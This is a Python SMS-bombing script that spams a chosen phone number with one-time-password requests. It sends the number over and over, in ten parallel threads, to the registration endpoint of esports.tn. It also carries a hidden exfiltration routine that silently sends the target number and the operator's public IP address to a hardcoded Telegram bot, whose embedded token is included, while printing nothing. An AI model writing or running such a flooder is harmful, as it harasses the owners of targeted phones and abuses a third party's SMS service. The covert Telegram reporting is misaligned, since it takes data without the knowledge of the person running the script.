import requests
import concurrent.futures

T_ID = "6760890601"
T_TOKEN = "7717751764:AAGXVgyzWZJqf58kwxK3UyZk-dnta1fC-4o"

get_url = "https://esports.tn/register"
post_url = "https://esports.tn/api/register-otp"

session = requests.Session()

initial_response = session.get(get_url, headers={"User-Agent": "Mozilla/5.0"})
if initial_response.status_code == 200:
    print("Session started successfully, cookies and tokens retrieved.")
else:
    print("Failed to retrieve initial tokens.")
    exit()

headers = {
    "Host": "esports.tn",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Origin": "https://esports.tn",
    "Referer": "https://esports.tn/register",
    "X-Xsrf-Token": session.cookies.get("XSRF-TOKEN", ""),
}


def get_ip():
    try:
        ip_response = requests.get("https://api.ipify.org?format=json")
        ip_data = ip_response.json()
        return ip_data.get("ip", "IP not found")
    except requests.exceptions.RequestException:
        return "IP not found"


def tg(phone_number, ip_address):
    tgu = f"https://api.telegram.org/bot{T_TOKEN}/sendMessage"
    message = f"Phone number: {phone_number}\nIP Address: {ip_address}"
    params = {
        "chat_id": T_ID,
        "text": message
    }
    response = requests.get(tgu, params=params)
    if response.status_code != 200:
        print("")
    else:
        print("")


def send_request(phone_number):
    data = {"phone_number": phone_number, "tos": True}
    response = session.post(post_url, headers=headers, json=data)
    print(response.status_code, response.text)


x = str(input("Number: "))


ip_address = get_ip()


tg(x, ip_address)

n = int(input("How many times do you want to spam the number?: "))

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(send_request, x) for _ in range(n)]
    for future in concurrent.futures.as_completed(futures):
        pass
